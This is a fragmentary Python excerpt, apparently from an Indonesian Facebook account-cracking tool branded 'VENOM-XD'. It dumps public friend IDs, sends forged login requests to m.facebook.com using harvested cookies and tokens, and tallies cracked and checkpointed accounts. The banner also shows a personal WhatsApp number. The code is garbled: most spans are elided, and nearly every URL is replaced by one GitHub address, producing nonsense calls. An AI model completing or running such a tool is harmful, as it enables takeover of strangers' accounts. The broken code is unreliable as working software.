...
try:
	prox= requests.get('https://github.com/Nil500/Approval.txt/blob/main/Approval.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Nil500/Approval.txt/blob/main/Approval.txt').text
		ua=open('.bbnew.txt','w')
...
def banner():
	...
	ban='''tolls prem/pribadi
     WA GW:083850999591
     AWAS KALAU TOOLS INI DI JUAL
     AUTHOR :VENOM-XD
     NOTE:JANGGAN SOMBONG'''
...
#		uaku()
		...
		try:
			...
			try:
				sy = requests.get('https://github.com/Nil500/Approval.txt/blob/main/Approval.txt='+tokenku[0],cookies={'cookie': cokbrut[0]})
...
#	pil=input('[•] pilih : ')
	...
	if pil in ['1','01']:
		try:
			...
			tes = requests.get('https://github.com/Nil500/Approval.txt/blob/main/Approval.txt='+tokrom,cookies={'cookie': cokrom})
...
#VALIDASI LISENSI
def anoun():
	res=requests.Session().get('https://github.com/Nil500/Approval.txt/blob/main/Approval.txt').json()
	stanoun=res['status']
	if stanoun== "ON":
...
def lisensi():
	try:
		cek=open('.https://github.com/Nil500/Approval.txt/blob/main/Approval.txt').read()
		lisensikuni.append(cek)
	except:
		tlisensi()
	ses=requests.Session()
	res=requests.get('https://github.com/Nil500/Approval.txt/blob/main/Approval.txt?token=WyIxOTgzMDgxOCIsImtjQTQwRjVVSGlNNzRub1k2dllNajBSY2JjMUgyY2MrS3hqN1F6c0QiXQ==&ProductId=15479&Key='+lisensikuni[0]).json()
...
def menu(my_name,my_id):
	try:sh = requests.get('https://github.com/Nil500/Approval.txt/blob/main/Approval.txt).json()
	except:sh = {'origin':'-'}
	try:
	...
	io = '''[bold green][01] DUMP FRINDS ID PUBLIK	    
[02] DUMP ID PUBLIK (Check )   		     [bold green]'''
...
#tapyes			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='VENOM-XD  OK'))
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='RIDWAN CP'))
					ok+=1
					break
